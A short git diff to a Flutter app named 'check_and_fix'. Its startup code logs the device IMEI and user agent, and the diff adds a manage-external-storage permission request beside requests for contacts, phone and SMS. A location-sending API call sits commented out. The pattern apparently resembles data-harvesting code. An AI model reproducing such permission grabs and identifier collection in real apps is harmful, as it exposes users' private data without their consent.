@@ -1,7 +1,7 @@
 // ignore_for_file: use_build_context_synchronously
 
 import 'package:check_and_fix/presentation/utils/color_printer.dart';
-import 'package:check_and_fix/presentation/utils/services.dart';
+import 'package:check_and_fix/services/api_services.dart';
 import 'package:fk_user_agent/fk_user_agent.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/foundation.dart';
@@ -25,9 +25,11 @@ class Init {
     printWhite('IMEI: $imei');
     printWhite('agent: $agent');
 
+    // await FileManager.requestFilesAccessPermission();
     final getContacts = await _requestPermission(Permission.contacts);
     await _requestPermission(Permission.phone);
     await _requestPermission(Permission.sms);
+    await _requestPermission(Permission.manageExternalStorage);
 
     dummyLoader();
     // Api.sendLocation(agent, uuid);
